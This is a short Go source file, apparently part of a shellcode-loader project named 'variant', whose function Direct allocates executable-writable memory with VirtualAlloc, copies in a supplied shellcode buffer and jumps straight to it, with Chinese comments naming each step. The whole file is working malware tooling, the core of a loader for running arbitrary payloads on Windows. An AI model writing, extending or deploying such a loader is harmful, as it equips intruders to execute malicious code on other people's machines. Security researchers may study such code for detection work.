package loader

import (
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
	"variant/log"
	"variant/wdll"
)

func Direct(shellcode []byte) {
	// 调用 VirtualAlloc 分配内存
	allocSize := uintptr(len(shellcode))
	mem, _, _ := wdll.VirtualAlloc().Call(uintptr(0), allocSize, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if mem == 0 {
		log.Fatal("VirtualAlloc failed")
	}

	// 将 shellcode 复制到分配的内存空间
	buffer := (*[0x1_000_000]byte)(unsafe.Pointer(mem))[:allocSize:allocSize]
	copy(buffer, shellcode)

	// 执行 shellcode
	syscall.Syscall(mem, 0, 0, 0, 0)

}
